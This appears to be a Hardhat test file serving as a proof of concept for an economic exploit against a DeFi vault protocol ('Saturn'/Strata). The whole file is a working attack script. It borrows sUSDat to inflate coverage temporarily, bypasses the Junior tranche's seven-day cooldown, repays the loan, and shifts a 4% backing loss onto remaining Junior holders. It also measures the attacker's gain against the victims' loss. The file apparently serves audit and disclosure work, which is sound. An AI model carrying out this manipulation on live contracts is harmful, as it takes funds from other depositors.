import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
import { UTest } from 'atma-utest';
import { $require } from 'dequanto/utils/$require';
import { $hh } from '../utils/$hh';
import { $erc20 } from '../utils/$erc20';
import { $erc4626 } from '../utils/$erc4626';
import { MockStakedUSDat } from '@0xc/hardhat/MockStakedUSDat/MockStakedUSDat';

/**
 * Saturn-native economic impact proof for transient coverage manipulation.
 *
 * The same global 4% sUSDat backing loss occurs in both worlds and the same
 * seven-day horizon elapses. The attacker cannot avoid the underlying loss:
 * any sUSDat held outside Strata loses the same percentage as Strata's sUSDat.
 *
 * Control: old JRT is correctly locked for seven days and remains exposed to
 *          Junior first-loss + Senior target funding.
 * Attack:  existing lender sUSDat is borrowed, deposited as temporary JRT to
 *          push coverage >30%, old JRT and temporary JRT both exit immediately,
 *          the exact sUSDat loan is repaid, then the same global loss occurs.
 *
 * The remaining difference is therefore the economic exposure that the JRT
 * cooldown was designed to retain, not an assumption that the attacker can sell
 * the underlying before a loss.
 */

const hh = new HardhatProvider();
const attacker = await hh.deployer(1);
const liquidityProvider = await hh.deployer(2);
const lender = await hh.deployer(3);
const test = await $hh.create('saturn');

const {
    jrtVault,
    srtVault,
    cdo,
} = await test.deploy({ initialDeposit: false });
const { base, sUSDat } = await test.factory.ensureUnderlying();
const { sharesCooldown } = await test.factory.ensureCooldowns(cdo);
const { deployer } = test;
const mockSUSDat = new MockStakedUSDat(sUSDat.address, sUSDat.client);

// Ordinary LP seeds the deployed state, then transfers pre-existing JRT to the attacker.
await $erc20.mint(base, deployer, liquidityProvider, 1_230);
await $erc4626.depositMeta(jrtVault, base.address, liquidityProvider, 230);
await $erc4626.depositMeta(srtVault, base.address, liquidityProvider, 1_000);
await $erc20.transfer(jrtVault, liquidityProvider, attacker.address, 25);

// Lender owns the temporary sUSDat before either world starts.
const LOAN_VALUE = 105n * 10n ** 6n;
const loanShares = await sUSDat.convertToShares(LOAN_VALUE);
await $erc4626.mint(sUSDat as any, lender, loanShares);
$require.eq(await sUSDat.balanceOf(lender.address), loanShares);

const coverageT0 = Number(await cdo.coverage());
$require.gt(coverageT0, 150_000);
$require.lt(coverageT0, 300_000);

await test.snapshot('transient-coverage-saturn-impact');

UTest.create({
    async $after () {
        await test.wipe();
    },
    async $teardown () {
        await test.reset('transient-coverage-saturn-impact');
    },

    async 'same global sUSDat loss: bypass preserves attacker value and shifts loss to remaining Junior' () {
        // ========================================================
        // Control world: attacker must remain in JRT for seven days
        // ========================================================
        let oldShares = await jrtVault.balanceOf(attacker.address);
        let lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        const controlImmediate = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.eq(controlImmediate, 0n);
        $require.gt(await jrtVault.balanceOf(sharesCooldown.address), 0n);

        await applyGlobalFourPercentSUSDatLoss();
        await test.mine('7days');

        await sharesCooldown.$receipt().finalize(
            attacker,
            jrtVault.address,
            sUSDat.address,
            attacker.address,
        );

        const controlUnits = await sUSDat.balanceOf(attacker.address);
        const controlValue = await sUSDat.convertToAssets(controlUnits);
        const controlLpValue = await jrtVault.convertToAssets(lpShares);

        $require.gt(controlValue, 0n);

        // ========================================================
        // Attack world: temporary coverage buys the zero-lock tier
        // ========================================================
        await test.reset('transient-coverage-saturn-impact');

        oldShares = await jrtVault.balanceOf(attacker.address);
        lpShares = await jrtVault.balanceOf(liquidityProvider.address);

        await $erc20.transfer(sUSDat, lender, attacker.address, loanShares);
        await $erc4626.depositMeta(jrtVault, sUSDat.address, attacker, loanShares);
        $require.gt(Number(await cdo.coverage()), 300_000);

        const oldAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            oldShares,
        );
        $require.gt(oldAssetsOut, 0n);
        $require.gt(Number(await cdo.coverage()), 300_000);

        const temporaryShares = await jrtVault.balanceOf(attacker.address);
        const temporaryAssetsOut = await $erc4626.redeemMeta(
            jrtVault,
            sUSDat.address,
            attacker,
            temporaryShares,
        );
        $require.gt(temporaryAssetsOut, 0n);

        $require.eq(await jrtVault.balanceOf(sharesCooldown.address), 0n);
        const coverageAfterUnwind = Number(await cdo.coverage());
        $require.gt(coverageAfterUnwind, 150_000);
        $require.lt(coverageAfterUnwind, 300_000);

        // Repay exactly the same sUSDat share units before the loss.
        $require.gte(await sUSDat.balanceOf(attacker.address), loanShares);
        await $erc20.transfer(sUSDat, attacker, lender.address, loanShares);
        $require.eq(await sUSDat.balanceOf(lender.address), loanShares);

        // Same global backing loss. Attacker's residual external sUSDat suffers it too.
        await applyGlobalFourPercentSUSDatLoss();
        await test.mine('7days');

        const attackUnits = await sUSDat.balanceOf(attacker.address);
        const attackValue = await sUSDat.convertToAssets(attackUnits);
        const attackLpValue = await jrtVault.convertToAssets(lpShares);

        const attackerAdvantage = attackValue - controlValue;
        const remainingJrtVictimLoss = controlLpValue - attackLpValue;

        console.log('control attacker value', controlValue.toString());
        console.log('attack attacker value', attackValue.toString());
        console.log('attacker advantage', attackerAdvantage.toString());
        console.log('control remaining-JRT value', controlLpValue.toString());
        console.log('attack remaining-JRT value', attackLpValue.toString());
        console.log('remaining-JRT victim loss', remainingJrtVictimLoss.toString());

        // USDat has 6 decimals. The advantage/loss must be whole economic units,
        // not rounding noise.
        $require.gt(attackerAdvantage, 3n * 10n ** 6n);
        $require.gt(remainingJrtVictimLoss, 3n * 10n ** 6n);

        // Same economic transfer, with a small residual allowed for the configured
        // immediate-exit fee split between retained Junior NAV and reserve.
        const diff = attackerAdvantage > remainingJrtVictimLoss
            ? attackerAdvantage - remainingJrtVictimLoss
            : remainingJrtVictimLoss - attackerAdvantage;
        $require.lt(diff, 1n * 10n ** 6n);
    },
});

async function applyGlobalFourPercentSUSDatLoss () {
    const backingBefore = await mockSUSDat.usdatBalance();
    $require.gt(backingBefore, 0n);
    await mockSUSDat.$receipt().setUsdatBalance(
        deployer,
        backingBefore * 96n / 100n,
    );
}
